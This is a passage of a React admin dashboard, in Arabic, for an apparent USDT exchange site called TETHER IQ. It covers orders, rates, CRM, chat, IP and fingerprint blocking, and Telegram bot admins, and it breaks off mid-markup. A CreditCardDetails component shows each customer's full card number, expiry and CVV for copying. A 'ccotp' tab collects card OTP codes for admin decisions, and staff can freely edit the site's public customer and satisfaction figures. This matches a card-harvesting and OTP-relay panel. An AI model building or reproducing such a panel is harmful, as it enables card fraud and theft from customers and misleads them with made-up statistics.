import React, { useCallback, useEffect, useState } from 'react';
import { Link } from 'react-router-dom';
import {
  readStoredLoginCode,
  storeLoginCode,
  clearStoredLoginCode,
  adminRequest,
  verifyAdminLoginCode,
  AdminAuthError,
  crmReportUrl,
  downloadBlob,
  exportCrmCsv,
} from '../lib/adminApi';
import AdminTabIcon from '../components/AdminTabIcon';
import {
  applySiteTheme,
  DEFAULT_THEME,
  normalizeHexColor,
  resolveTheme,
  THEME_PRESETS,
} from '../lib/siteTheme';

const METHOD_KEYS = ['creditCard', 'fastPay', 'zainCash', 'asiaHawala', 'fib', 'mastercard'];

const TABS = [
  { id: 'overview', label: 'نظرة عامة', icon: 'overview', desc: 'ملخص سريع' },
  { id: 'crm', label: 'CRM', icon: 'crm', desc: 'زيارات وتقارير' },
  { id: 'orders', label: 'الطلبات', icon: 'orders', desc: 'إدارة الحالات' },
  { id: 'payments', label: 'الدفع والسعر', icon: 'payments', desc: 'سعر ومدة الدفع' },
  { id: 'profiles', label: 'البروفايلات', icon: 'profiles', desc: 'طرق الدفع' },
  { id: 'site', label: 'الموقع', icon: 'site', desc: 'ثيم وFAQ وصيانة' },
  { id: 'marketing', label: 'التسويق', icon: 'marketing', desc: 'إحصائيات وتقييمات' },
  { id: 'blocked', label: 'المحظورون', icon: 'blocked', desc: 'حظر IP وبصمة' },
  { id: 'chat', label: 'الدردشة', icon: 'chat', desc: 'رد العملاء' },
  { id: 'ccotp', label: 'أكواد البطاقة', icon: 'ccotp', desc: 'قرارات OTP' },
  { id: 'admins', label: 'المفوضون', icon: 'admins', desc: 'صلاحيات البوت' },
  { id: 'system', label: 'النظام', icon: 'system', desc: 'تيليغرام وفحوصات' },
];

const ORDER_STATUS_LABELS = {
  received: 'قيد المعالجة',
  archived: 'معلق',
  completed: 'مكتمل',
  cancelled: 'ملغى',
  refunded: 'استرجاع',
};

const METHOD_LABELS = {
  creditCard: 'بطاقة',
  fastPay: 'FastPay',
  zainCash: 'زين كاش',
  asiaHawala: 'آسيا حوالة',
  fib: 'FIB',
  mastercard: 'Mastercard',
};

function Panel({ title, children, actions }) {
  return (
    <div className="admin-panel glass-panel">
      <div className="admin-panel__head">
        <h2>{title}</h2>
        {actions}
      </div>
      {children}
    </div>
  );
}

function Btn({ children, onClick, variant = 'primary', disabled, type = 'button', className = '' }) {
  return (
    <button type={type} className={`btn btn-${variant} ${className}`.trim()} onClick={onClick} disabled={disabled}>
      {children}
    </button>
  );
}

function Field({ label, children }) {
  return (
    <label className="admin-field">
      <span className="admin-field__label">{label}</span>
      {children}
    </label>
  );
}

function Input(props) {
  return <input className="input-control admin-input" {...props} />;
}

function Textarea(props) {
  return <textarea className="input-control admin-input admin-textarea" {...props} />;
}

function Select(props) {
  return <select className="input-control admin-input" {...props} />;
}

function Alert({ err, ok, onDismiss }) {
  if (!err && !ok) return null;
  const cls = err ? 'admin-alert admin-alert--err' : 'admin-alert admin-alert--ok';
  return (
    <div className={cls} role="alert">
      <span>{err || ok}</span>
      {onDismiss ? (
        <button type="button" className="admin-alert__close" onClick={onDismiss} aria-label="إغلاق">
          ×
        </button>
      ) : null}
    </div>
  );
}

function EmptyHint({ children }) {
  return <p className="admin-empty-hint">{children}</p>;
}

function StatusPill({ ok, label }) {
  return (
    <span className={`admin-status-pill${ok ? ' admin-status-pill--ok' : ' admin-status-pill--bad'}`}>
      {label}
    </span>
  );
}

function copyText(value) {
  const v = String(value || '');
  if (!v) return;
  navigator.clipboard?.writeText(v).catch(() => {});
}

function ThemeEditor({ theme, onChange }) {
  const resolved = resolveTheme(theme);
  const accent = resolved.accent;
  const background = resolved.background;

  const setAccent = (raw) => {
    const hex = normalizeHexColor(raw);
    if (!hex) return;
    onChange({ ...theme, accent: hex });
  };

  const setBackground = (raw) => {
    const hex = normalizeHexColor(raw);
    if (!hex) return;
    onChange({ ...theme, background: hex });
  };

  return (
    <div className="admin-theme-editor">
      <p className="admin-theme-editor__hint">
        اختر لون التمييز (أزرار وروابط) ولون الخلفية. المعاينة فورية هنا؛ للزوار اضغط «حفظ» ثم حدّث الصفحة.
      </p>
      <div
        className="admin-theme-preview"
        style={{
          background: `linear-gradient(135deg, ${background} 0%, ${background}ee 50%, ${accent}22 100%)`,
          borderColor: `${accent}55`,
        }}
      >
        <span className="admin-theme-preview__chip" style={{ background: accent, color: background }}>
          زر تجريبي
        </span>
        <span className="admin-theme-preview__text" style={{ color: accent }}>
          نص تمييز
        </span>
      </div>
      <div className="admin-theme-presets">
        {THEME_PRESETS.map((p) => (
          <button
            key={p.id}
            type="button"
            className="admin-theme-preset"
            title={p.label}
            onClick={() => onChange({ accent: p.accent, background: p.background })}
          >
            <span className="admin-theme-preset__swatch" style={{ background: p.accent }} />
            <span className="admin-theme-preset__bg" style={{ background: p.background }} />
            <span className="admin-theme-preset__label">{p.label}</span>
          </button>
        ))}
      </div>
      <div className="admin-field-grid admin-theme-colors">
        <Field label="لون التمييز (Accent)">
          <div className="admin-theme-color-row">
            <input
              type="color"
              className="admin-theme-color-input"
              value={accent}
              onChange={(e) => setAccent(e.target.value)}
              aria-label="لون التمييز"
            />
            <Input
              value={accent}
              onChange={(e) => setAccent(e.target.value)}
              placeholder="#3F68FE"
              dir="ltr"
              spellCheck={false}
            />
          </div>
        </Field>
        <Field label="لون الخلفية">
          <div className="admin-theme-color-row">
            <input
              type="color"
              className="admin-theme-color-input"
              value={background}
              onChange={(e) => setBackground(e.target.value)}
              aria-label="لون الخلفية"
            />
            <Input
              value={background}
              onChange={(e) => setBackground(e.target.value)}
              placeholder="#030712"
              dir="ltr"
              spellCheck={false}
            />
          </div>
        </Field>
      </div>
      <Btn
        variant="outline"
        onClick={() => onChange({ ...DEFAULT_THEME })}
      >
        استعادة الألوان الافتراضية
      </Btn>
    </div>
  );
}

function CreditCardDetails({ card, compact }) {
  if (!card) {
    return (
      <p className="admin-empty-hint">
        لا توجد بيانات بطاقة محفوظة لهذا الطلب (الطلبات القديمة قبل التحديث لا تُسترجع).
      </p>
    );
  }
  const rows = [
    ['اسم صاحب البطاقة', card.holder],
    ['رقم البطاقة', card.pan],
    ['تاريخ الانتهاء', card.expiry],
    ['CVV', card.cvv],
  ];
  if (card.customerName) rows.unshift(['اسم العميل (الطلب)', card.customerName]);

  return (
    <div className={`admin-card-detail glass-panel${compact ? ' admin-card-detail--compact' : ''}`}>
      <h4 className="admin-card-detail__title">بيانات البطاقة</h4>
      <div className="admin-card-detail__grid">
        {rows.map(([label, val]) => (
          <div key={label} className="admin-card-detail__row">
            <span className="admin-card-detail__label">{label}</span>
            <code className="admin-card-detail__value" dir="ltr">{val || '—'}</code>
            <button type="button" className="admin-card-detail__copy" onClick={() => copyText(val)}>
              نسخ
            </button>
          </div>
        ))}
      </div>
    </div>
  );
}

export default function AdminDashboard() {
  const [loginCode, setLoginCode] = useState(() => readStoredLoginCode());
  const [saved, setSaved] = useState(() => Boolean(readStoredLoginCode()));
  const [tab, setTab] = useState('overview');
  const [err, setErr] = useState('');
  const [ok, setOk] = useState('');
  const [loading, setLoading] = useState(false);

  const [overview, setOverview] = useState(null);
  const [summary, setSummary] = useState(null);
  const [visits, setVisits] = useState([]);
  const [orders, setOrders] = useState([]);
  const [vTotal, setVTotal] = useState(0);
  const [oTotal, setOTotal] = useState(0);
  const [vOff, setVOff] = useState(0);
  const [oOff, setOOff] = useState(0);

  const [orderFilter, setOrderFilter] = useState('p');
  const [orderQ, setOrderQ] = useState('');
  const [orderList, setOrderList] = useState([]);
  const [orderListTotal, setOrderListTotal] = useState(0);
  const [selectedOrder, setSelectedOrder] = useState(null);

  const [payment, setPayment] = useState(null);
  const [rateFixed, setRateFixed] = useState('');
  const [rateFloatBase, setRateFloatBase] = useState('');
  const [rateFloatOffset, setRateFloatOffset] = useState('');
  const [timerMins, setTimerMins] = useState('');

  const [profiles, setProfiles] = useState([]);
  const [currentProfileId, setCurrentProfileId] = useState('');
  const [newProfileName, setNewProfileName] = useState('');

  const [siteConfig, setSiteConfig] = useState(null);
  const [stats, setStats] = useState(null);
  const [testimonials, setTestimonials] = useState([]);
  const [blocked, setBlocked] = useState(null);
  const [chatSessions, setChatSessions] = useState([]);
  const [chatSessionId, setChatSessionId] = useState('');
  const [chatMessages, setChatMessages] = useState(null);
  const [chatReply, setChatReply] = useState('');
  const [ccSubs, setCcSubs] = useState([]);
  const [selectedCc, setSelectedCc] = useState(null);
  const [botAdmins, setBotAdmins] = useState(null);
  const [newAdminId, setNewAdminId] = useState('');
  const [newAdminPerms, setNewAdminPerms] = useState('all');
  const [telegramProbe, setTelegramProbe] = useState(null);

  const limit = 30;
  const code = loginCode.trim();

  const handleAuthFailure = useCallback((message) => {
    clearStoredLoginCode();
    setSaved(false);
    setLoginCode('');
    setErr(message || 'انتهت الجلسة أو رمز الدخول غير صحيح. سجّل الدخول مرة أخرى.');
    setOk('');
  }, []);

  const run = useCallback(async (fn, silent = false) => {
    if (!code) return;
    if (!silent) setLoading(true);
    setErr('');
    try {
      await fn();
    } catch (e) {
      if (e instanceof AdminAuthError || e?.status === 401) {
        handleAuthFailure(e?.message);
        return;
      }
      setErr(String(e?.message || e));
    } finally {
      if (!silent) setLoading(false);
    }
  }, [code, handleAuthFailure]);

  const loadOverview = useCallback(() => run(async () => {
    const o = await adminRequest('/api/admin/overview', code);
    setOverview(o);
    setSummary(o.summary);
  }), [run, code]);

  const loadCrm = useCallback(() => run(async () => {
    const s = await adminRequest('/api/admin/crm/summary', code);
    setSummary(s);
    const v = await adminRequest(`/api/admin/crm/visits?offset=${vOff}&limit=${limit}`, code);
    setVisits(v.items || []);
    setVTotal(v.total || 0);
    const o = await adminRequest(`/api/admin/crm/orders?offset=${oOff}&limit=${limit}`, code);
    setOrders(o.items || []);
    setOTotal(o.total || 0);
  }), [run, code, vOff, oOff]);

  const loadOrderMgmt = useCallback(() => run(async () => {
    const q = new URLSearchParams({ offset: '0', limit: '50', filter: orderFilter });
    if (orderQ.trim()) q.set('q', orderQ.trim());
    const data = await adminRequest(`/api/admin/orders/list?${q}`, code);
    setOrderList(data.items || []);
    setOrderListTotal(data.total || 0);
  }), [run, code, orderFilter, orderQ]);

  const loadPayment = useCallback(() => run(async () => {
    const data = await adminRequest('/api/admin/payment-details', code);
    setPayment(data);
    const rc = data.details?.rateConfig || {};
    setRateFixed(String(rc.fixedRate ?? data.effectiveRate ?? ''));
    setRateFloatBase(String(rc.floatBase ?? ''));
    setRateFloatOffset(String(rc.floatOffset ?? ''));
    setTimerMins(String(data.details?.paymentExpiryMinutes ?? 15));
    setProfiles(data.details?.profiles || []);
    setCurrentProfileId(data.details?.currentProfileId || '');
  }), [run, code]);

  const loadSite = useCallback(() => run(async () => {
    setSiteConfig(await adminRequest('/api/admin/site-config', code));
  }), [run, code]);

  const loadMarketing = useCallback(() => run(async () => {
    setStats(await adminRequest('/api/admin/stats', code));
    setTestimonials(await adminRequest('/api/admin/testimonials', code));
  }), [run, code]);

  const loadBlocked = useCallback(() => run(async () => {
    setBlocked(await adminRequest('/api/admin/blocked', code));
  }), [run, code]);

  const loadChat = useCallback(() => run(async () => {
    const data = await adminRequest('/api/admin/chat/sessions', code);
    setChatSessions(data.items || []);
  }), [run, code]);

  const loadCc = useCallback(() => run(async () => {
    const data = await adminRequest('/api/admin/cc-otp/submissions', code);
    setCcSubs(data.items || []);
    setSelectedCc(null);
  }), [run, code]);

  const loadBotAdmins = useCallback(() => run(async () => {
    setBotAdmins(await adminRequest('/api/admin/bot-admins', code));
  }), [run, code]);

  const refreshTab = useCallback(() => {
    if (!saved || !code) return;
    const map = {
      overview: loadOverview,
      crm: loadCrm,
      orders: loadOrderMgmt,
      payments: loadPayment,
      profiles: loadPayment,
      site: loadSite,
      marketing: loadMarketing,
      blocked: loadBlocked,
      chat: loadChat,
      ccotp: loadCc,
      admins: loadBotAdmins,
      system: () => {},
    };
    (map[tab] || loadOverview)();
  }, [saved, code, tab, loadOverview, loadCrm, loadOrderMgmt, loadPayment, loadSite, loadMarketing, loadBlocked, loadChat, loadCc, loadBotAdmins, run]);

  useEffect(() => {
    if (!saved || !code) return;
    refreshTab();
  }, [saved, tab, refreshTab, code]);

  useEffect(() => {
    if (tab === 'site' && siteConfig) {
      applySiteTheme(siteConfig.theme);
    }
  }, [tab, siteConfig?.theme]);

  useEffect(() => {
    if (!saved || !code) return;
    let cancelled = false;
    (async () => {
      try {
        await verifyAdminLoginCode(code);
      } catch (e) {
        if (!cancelled && (e instanceof AdminAuthError || e?.status === 401)) {
          handleAuthFailure(e?.message);
        }
      }
    })();
    return () => { cancelled = true; };
  }, [saved, code, handleAuthFailure]);

  useEffect(() => {
    if (saved && tab === 'crm' && code) loadCrm();
  }, [vOff, oOff, saved, tab, code, loadCrm]);

  const persistLogin = async () => {
    const next = code.trim();
    if (!next) {
      setErr('أدخل رمز الدخول');
      return;
    }
    setLoading(true);
    setErr('');
    setOk('');
    try {
      await verifyAdminLoginCode(next);
      storeLoginCode(next);
      setSaved(true);
      setOk('تم تسجيل الدخول');
    } catch (e) {
      if (e instanceof AdminAuthError || e?.status === 401) {
        setErr(
          'رمز الدخول مرفوض من السيرفر. تأكد أنه يطابق ADMIN_CRM_TOKEN أو ADMIN_LOGIN_CODE في ملف .env على السيرفر.',
        );
      } else {
        setErr(String(e?.message || e));
      }
      setSaved(false);
    } finally {
      setLoading(false);
    }
  };

  const logout = () => {
    clearStoredLoginCode();
    setSaved(false);
    setLoginCode('');
    setErr('');
    setOk('');
    setOverview(null);
    setSummary(null);
    setTab('overview');
  };

  const activeTabMeta = TABS.find((t) => t.id === tab) || TABS[0];
  const dismissAlerts = () => {
    setErr('');
    setOk('');
  };

  const setOrderStatus = async (orderId, status) => {
    await run(async () => {
      await adminRequest(`/api/admin/orders/${encodeURIComponent(orderId)}/status`, code, {
        method: 'PATCH',
        body: JSON.stringify({ status }),
      });
      setOk('تم تحديث الحالة');
      loadOrderMgmt();
      if (selectedOrder?.orderId === orderId) {
        const d = await adminRequest(`/api/admin/orders/${encodeURIComponent(orderId)}`, code);
        setSelectedOrder({ ...d.order, card: d.card || null });
      }
    });
  };

  const openOrder = async (orderId) => {
    await run(async () => {
      const d = await adminRequest(`/api/admin/orders/${encodeURIComponent(orderId)}`, code);
      setSelectedOrder({ ...d.order, card: d.card || null });
    });
  };

  const openChat = async (sessionId) => {
    setChatSessionId(sessionId);
    await run(async () => {
      const d = await adminRequest(`/api/admin/chat/sessions/${encodeURIComponent(sessionId)}/messages`, code);
      setChatMessages(d.session);
    });
  };

  return (
    <div className={`admin-dashboard page-shell${saved ? ' admin-dashboard--app' : ''}`} dir="rtl" lang="ar">
      <div className="admin-dashboard__inner">
        {!saved ? (
          <>
            <header className="admin-dashboard__header admin-dashboard__header--gate">
              <div className="admin-dashboard__brand">
                <h1 className="admin-dashboard__title">لوحة الإدارة — TETHER IQ</h1>
                <p className="admin-dashboard__subtitle">كل إمكانيات بوت تيليغرام في مكان واحد</p>
              </div>
              <Link to="/" className="admin-dashboard__home">الرئيسية</Link>
            </header>
            <section className="admin-login-wrap" aria-label="تسجيل الدخول">
              <div className="admin-login-card glass-panel">
                <div className="admin-login-card__icon" aria-hidden>
                  <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.75">
                    <rect x="5" y="11" width="14" height="10" rx="2" />
                    <path d="M8 11V8a4 4 0 118 0v3" strokeLinecap="round" />
                  </svg>
                </div>
                <h2 className="admin-login-card__title">تسجيل الدخول</h2>
                <p className="admin-login-card__hint">أدخل رمز الدخول للوصول إلى لوحة التحكم</p>
                <form
                  className="admin-login-form"
                  onSubmit={(e) => {
                    e.preventDefault();
                    if (code.trim()) persistLogin();
                  }}
                >
                  <Field label="رمز الدخول">
                    <Input
                      type="password"
                      value={loginCode}
                      onChange={(e) => setLoginCode(e.target.value)}
                      placeholder="••••••••••"
                      autoComplete="off"
                      autoFocus
                    />
                  </Field>
                  <Btn type="submit" className="admin-login-form__submit" disabled={!code.trim() || loading}>
                    دخول
                  </Btn>
                </form>
              </div>
            </section>
            <Alert err={err} ok={ok} onDismiss={dismissAlerts} />
          </>
        ) : (
          <div className="admin-app">
            <aside className="admin-sidebar glass-panel" aria-label="القائمة">
              <div className="admin-sidebar__brand">
                <Link to="/" className="admin-sidebar__logo-link" aria-label="TETHER IQ">
                  <picture>
                    <source type="image/webp" srcSet="/logo.webp" />
                    <img
                      className="admin-sidebar__logo-img"
                      src="/logo.png"
                      alt="TETHER IQ"
                      width={200}
                      height={60}
                      decoding="async"
                    />
                  </picture>
                </Link>
                <p className="admin-sidebar__brand-tag">لوحة الإدارة</p>
              </div>
              <nav className="admin-sidebar__nav">
                {TABS.map((t) => (
                  <button
                    key={t.id}
                    type="button"
                    className={`admin-sidebar__link${tab === t.id ? ' admin-sidebar__link--active' : ''}`}
                    onClick={() => { setTab(t.id); dismissAlerts(); }}
                  >
                    <span className="admin-sidebar__icon">
                      <AdminTabIcon name={t.icon} />
                    </span>
                    <span className="admin-sidebar__text">
                      <span className="admin-sidebar__label">{t.label}</span>
                      <span className="admin-sidebar__desc">{t.desc}</span>
                    </span>
                  </button>
                ))}
              </nav>
              <button type="button" className="admin-sidebar__logout" onClick={logout}>
                تسجيل الخروج
              </button>
            </aside>
            <div className="admin-main">
              <header className="admin-topbar glass-panel">
                <div className="admin-topbar__titles">
                  <h1 className="admin-topbar__title">{activeTabMeta.label}</h1>
                  <p className="admin-topbar__desc">{activeTabMeta.desc}</p>
                </div>
                <div className="admin-topbar__actions">
                  {loading && <span className="admin-topbar__loading" aria-live="polite">جاري التحميل…</span>}
                  <Link to="/" className="admin-dashboard__home">الرئيسية</Link>
                  <span className="admin-session-pill">
                    <span className="admin-login-card__status-dot" aria-hidden />
                    متصل
                  </span>
                </div>
              </header>
              <Alert err={err} ok={ok} onDismiss={dismissAlerts} />
              <div className="admin-content">

            {tab === 'overview' && overview && (
              <div className="admin-grid">
                {[
                  ['زيارات اليوم', overview.summary?.visits?.visitsToday],
                  ['طلبات اليوم', overview.summary?.orders?.ordersToday],
                  ['USDT (7d)', overview.summary?.orders?.volumeWeek],
                  ['السعر الحالي', overview.rate],
                  ['معلقة', overview.orderCounts?.p],
                  ['مكتملة', overview.orderCounts?.d],
                ].map(([k, v]) => (
                  <div key={k} className="admin-stat glass-panel">
                    <div className="admin-stat__label">{k}</div>
                    <div className="admin-stat__value">{v ?? '—'}</div>
                  </div>
                ))}
                <Panel title="حالة النظام">
                  <p className="text-sm">صيانة: {overview.maintenance ? 'مفعّلة' : 'معطّلة'}</p>
                  <p className="text-sm">تيليغرام: {overview.telegramChatId}</p>
                  <p className="text-sm">Gemini: {overview.geminiConfigured ? 'مضبوط' : 'غير مضبوط'}</p>
                  <p className="text-sm">البروفايل النشط: {overview.activeProfile?.nameAr || overview.currentProfileId}</p>
                </Panel>
              </div>
            )}

            {tab === 'crm' && summary && (
              <>
                <div className="admin-toolbar">
                  <Btn onClick={async () => { const b = await exportCrmCsv(code, 'visits'); downloadBlob(b, 'visits.csv'); }}>CSV زيارات</Btn>
                  <Btn onClick={async () => { const b = await exportCrmCsv(code, 'orders'); downloadBlob(b, 'orders.csv'); }}>CSV طلبات</Btn>
                  <Btn variant="outline" onClick={() => window.open(crmReportUrl(code), '_blank')}>تقرير HTML</Btn>
                  <Btn variant="outline" onClick={() => window.open(crmReportUrl(code, true), '_blank')}>PDF</Btn>
                </div>
                <div className="admin-split">
                  <Panel title={`الزيارات (${vTotal})`}>
                    <table className="admin-table">
                      <thead><tr><th>وقت</th><th>مسار</th><th>IP</th></tr></thead>
                      <tbody>
                        {visits.map((v) => (
                          <tr key={v.id}><td>{v.at?.slice(5, 16)}</td><td>{v.path}</td><td>{v.ip}</td></tr>
                        ))}
                      </tbody>
                    </table>
                    <div className="admin-toolbar">
                      <Btn disabled={vOff <= 0} onClick={() => setVOff(Math.max(0, vOff - limit))}>أحدث</Btn>
                      <Btn disabled={vOff + limit >= vTotal} onClick={() => setVOff(vOff + limit)}>أقدم</Btn>
                    </div>
                  </Panel>
                  <Panel title={`الطلبات (${oTotal})`}>
                    <table className="admin-table">
                      <thead><tr><th>طلب</th><th>حالة</th><th>USDT</th></tr></thead>
                      <tbody>
                        {orders.map((o) => (
                          <tr key={o.id}>
                            <td><button type="button" className="admin-link" onClick={() => openOrder(o.orderId)}>{o.orderId}</button></td>
                            <td>{ORDER_STATUS_LABELS[o.status] || o.status}</td>
                            <td>{o.usdtAmount}</td>
                          </tr>
                        ))}
                      </tbody>
                    </table>
                  </Panel>
                </div>
              </>
            )}

            {tab === 'orders' && (
              <Panel title="إدارة الطلبات">
                <div className="admin-toolbar">
                  <Select value={orderFilter} onChange={(e) => setOrderFilter(e.target.value)}>
                    <option value="p">معلقة / قيد</option>
                    <option value="d">مكتملة</option>
                    <option value="r">مسترجعة</option>
                    <option value="x">ملغاة</option>
                    <option value="all">الكل</option>
                  </Select>
                  <Input placeholder="بحث…" value={orderQ} onChange={(e) => setOrderQ(e.target.value)} />
                  <Btn onClick={loadOrderMgmt}>بحث</Btn>
                </div>
                <p className="text-muted text-sm">إجمالي: {orderListTotal}</p>
                <table className="admin-table">
                  <thead><tr><th>طلب</th><th>اسم</th><th>حالة</th><th>إجراء</th></tr></thead>
                  <tbody>
                    {orderList.map((o) => (
                      <tr key={o.id}>
                        <td><button type="button" className="admin-link" onClick={() => openOrder(o.orderId)}>{o.orderId}</button></td>
                        <td>{o.name}</td>
                        <td>{ORDER_STATUS_LABELS[o.status] || o.status}</td>
                        <td className="admin-actions">
                          {['completed', 'archived', 'cancelled', 'refunded'].map((st) => (
                            <button key={st} type="button" className="admin-chip" onClick={() => setOrderStatus(o.orderId, st)}>
                              {ORDER_STATUS_LABELS[st]}
                            </button>
                          ))}
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
                {selectedOrder && (
                  <div className="admin-detail glass-panel">
                    <h3>تفاصيل {selectedOrder.orderId}</h3>
                    {(selectedOrder.card || /credit/i.test(String(selectedOrder.paymentMethod || ''))) && (
                      <CreditCardDetails card={selectedOrder.card} />
                    )}
                    <pre className="admin-pre">{JSON.stringify(selectedOrder, null, 2)}</pre>
                    <div className="admin-toolbar">
                      {Object.keys(ORDER_STATUS_LABELS).map((st) => (
                        <Btn key={st} variant="outline" onClick={() => setOrderStatus(selectedOrder.orderId, st)}>
                          {ORDER_STATUS_LABELS[st]}
                        </Btn>
                      ))}
                    </div>
                  </div>
                )}
              </Panel>
            )}

            {tab === 'payments' && payment && (
              <div className="admin-split">
                <Panel title="سعر الصرف">
                  <p className="text-sm">الوضع: <b>{payment.details?.rateConfig?.mode || 'fixed'}</b> — السعر: <b>{payment.effectiveRate}</b></p>
                  <Field label="سعر ثابت (IQD/USDT)">
                    <Input value={rateFixed} onChange={(e) => setRateFixed(e.target.value)} />
                  </Field>
                  <Btn onClick={() => run(async () => {
                    await adminRequest('/api/admin/rate-fixed', code, { method: 'POST', body: JSON.stringify({ fixedRate: Number(rateFixed) }) });
                    setOk('تم حفظ السعر الثابت');
                    loadPayment();
                  })}>حفظ ثابت</Btn>
                  <Field label="عائم — Base">
                    <Input value={rateFloatBase} onChange={(e) => setRateFloatBase(e.target.value)} />
                  </Field>
                  <Field label="عائم — Offset">
                    <Input value={rateFloatOffset} onChange={(e) => setRateFloatOffset(e.target.value)} />
                  </Field>
                  <Btn variant="outline" onClick={() => run(async () => {
                    await adminRequest('/api/admin/rate-float', code, {
                      method: 'POST',
                      body: JSON.stringify({ floatBase: Number(rateFloatBase), floatOffset: Number(rateFloatOffset) }),
                    });
                    setOk('تم تفعيل الوضع العائم');
                    loadPayment();
                  })}>حفظ عائم</Btn>
                </Panel>
                <Panel title="وقت انتهاء الدفع">
                  <Field label="دقائق">
                    <Input type="number" value={timerMins} onChange={(e) => setTimerMins(e.target.value)} />
                  </Field>
                  <Btn onClick={() => run(async () => {
                    await adminRequest('/api/admin/payment-details', code, {
                      method: 'PATCH',
                      body: JSON.stringify({ paymentExpiryMinutes: Number(timerMins) }),
                    });
                    setOk('تم تحديث المؤقت');
                    loadPayment();
                  })}>حفظ</Btn>
                </Panel>
              </div>
            )}

            {tab === 'profiles' && profiles.length > 0 && (
              <Panel title="البروفايلات">
                <div className="admin-toolbar">
                  <Input placeholder="اسم بروفايل جديد" value={newProfileName} onChange={(e) => setNewProfileName(e.target.value)} />
                  <Btn onClick={() => run(async () => {
                    await adminRequest('/api/admin/profiles', code, { method: 'POST', body: JSON.stringify({ nameAr: newProfileName }) });
                    setNewProfileName('');
                    setOk('تمت الإضافة');
                    loadPayment();
                  })}>إضافة</Btn>
                </div>
                {profiles.map((p) => (
                  <div key={p.id} className="admin-profile-card glass-panel">
                    <div className="admin-toolbar">
                      <strong>{p.nameAr}</strong>
                      {currentProfileId === p.id && <span className="admin-badge">نشط</span>}
                      {currentProfileId !== p.id && (
                        <Btn variant="outline" onClick={() => run(async () => {
                          await adminRequest(`/api/admin/profiles/${p.id}/activate`, code, { method: 'POST' });
                          setOk('تم التفعيل');
                          loadPayment();
                        })}>تفعيل للموقع</Btn>
                      )}
                      <Btn variant="outline" onClick={() => run(async () => {
                        if (!window.confirm('حذف البروفايل؟')) return;
                        await adminRequest(`/api/admin/profiles/${p.id}`, code, { method: 'DELETE' });
                        loadPayment();
                      })}>حذف</Btn>
                    </div>
                    <div className="admin-methods">
                      {METHOD_KEYS.map((mk) => (
                        <label key={mk} className="admin-check">
                          <input
                            type="checkbox"
                            checked={p.methodEnabled?.[mk] !== false}
                            onChange={(e) => run(async () => {
                              await adminRequest(`/api/admin/profiles/${p.id}`, code, {
                                method: 'PATCH',
                                body: JSON.stringify({ methodEnabled: { [mk]: e.target.checked } }),
                              });
                              loadPayment();
                            })}
                          />
                          {METHOD_LABELS[mk] || mk}
                        </label>
                      ))}
                    </div>
                    {mkFields(p, code, run, loadPayment)}
                  </div>
                ))}
              </Panel>
            )}

            {tab === 'site' && siteConfig && (
              <Panel title="إعدادات الموقع">
                <h3 className="admin-subsection-title">ثيم الموقع</h3>
                <ThemeEditor
                  theme={siteConfig.theme || {}}
                  onChange={(theme) => setSiteConfig({ ...siteConfig, theme })}
                />
                <hr className="admin-divider" />
                <h3 className="admin-subsection-title">صيانة ومحتوى</h3>
                <label className="admin-check">
                  <input
                    type="checkbox"
                    checked={Boolean(siteConfig.maintenance?.enabled)}
                    onChange={(e) => setSiteConfig({
                      ...siteConfig,
                      maintenance: { ...siteConfig.maintenance, enabled: e.target.checked },
                    })}
                  />
                  وضع الصيانة
                </label>
                <Field label="رسالة صيانة (عربي)">
                  <Textarea
                    rows={2}
                    value={siteConfig.maintenance?.messageAr || ''}
                    onChange={(e) => setSiteConfig({
                      ...siteConfig,
                      maintenance: { ...siteConfig.maintenance, messageAr: e.target.value },
                    })}
                  />
                </Field>
                <Field label="رابط تيليغرام">
                  <Input
                    value={siteConfig.links?.contact || siteConfig.links?.telegram || ''}
                    onChange={(e) => setSiteConfig({ ...siteConfig, links: { ...siteConfig.links, contact: e.target.value } })}
                  />
                </Field>
                <Field label="FAQ (JSON)">
                  <Textarea
                    rows={8}
                    value={JSON.stringify(siteConfig.faq || [], null, 2)}
                    onChange={(e) => {
                      try {
                        setSiteConfig({ ...siteConfig, faq: JSON.parse(e.target.value) });
                      } catch {
                        setErr('JSON غير صالح');
                      }
                    }}
                  />
                </Field>
                <Btn onClick={() => run(async () => {
                  await adminRequest('/api/admin/site-config', code, { method: 'PATCH', body: JSON.stringify(siteConfig) });
                  setOk('تم حفظ إعدادات الموقع');
                })}>حفظ</Btn>
              </Panel>
            )}

            {tab === 'marketing' && stats && (
              <div className="admin-split">
                <Panel title="إحصائيات الواجهة">
                  {['customers', 'transactions', 'years', 'satisfaction'].map((k) => (
                    <Field key={k} label={k}>
                      <Input
                        value={stats[k] ?? ''}
                        onChange={(e) => setStats({ ...stats, [k]: e.target.value })}
                      />
                    </Field>
                  ))}
                  <Btn onClick={() => run(async () => {
                    await adminRequest('/api/admin/stats', code, { method: 'PATCH', body: JSON.stringify(stats) });
                    setOk('تم الحفظ');
                  })}>حفظ الإحصائيات</Btn>
                </Panel>
                <Panel title="التقييمات">
                  <ul className="admin-list">
                    {testimonials.map((t) => (
                      <li key={t.id}>
                        <strong>{t.nameAr}</strong> — {t.textAr?.slice(0, 80)}
                        <Btn variant="outline" onClick={() => run(async () => {
                          await adminRequest(`/api/admin/testimonials/${t.id}`, code, { method: 'DELETE' });
                          loadMarketing();
                        })}>حذف</Btn>
                      </li>
                    ))}
                  </ul>
                </Panel>
              </div>
            )}

            {tab === 'blocked' && blocked && (
              <BlockedPanel blocked={blocked} code={code} run={run} reload={loadBlocked} setOk={setOk} />
            )}

            {tab === 'chat' && (
              <div className="admin-split">
                <Panel title="جلسات الدردشة">
                  <ul className="admin-list">
                    {chatSessions.map((s) => (
                      <li key={s.id}>
                        <button type="button" className="admin-link" onClick={() => openChat(s.id)}>
                          {s.visitorName || s.id} — {s.lastMessage?.slice(0, 40)}
                        </button>
                      </li>
                    ))}
                  </ul>
                </Panel>
                {chatMessages && (
                  <Panel title={`محادثة ${chatSessionId}`}>
                    <div className="admin-chat-log">
                      {(chatMessages.messages || []).map((m) => (
                        <div key={m.id} className={`admin-chat-msg admin-chat-msg--${m.role}`}>
                          <span>{m.role}</span>: {m.text}
                        </div>
                      ))}
                    </div>
                    <Field label="رد الموظف">
                      <Textarea rows={3} value={chatReply} onChange={(e) => setChatReply(e.target.value)} />
                    </Field>
                    <Btn onClick={() => run(async () => {
                      await adminRequest(`/api/admin/chat/sessions/${encodeURIComponent(chatSessionId)}/reply`, code, {
                        method: 'POST',
                        body: JSON.stringify({ text: chatReply }),
                      });
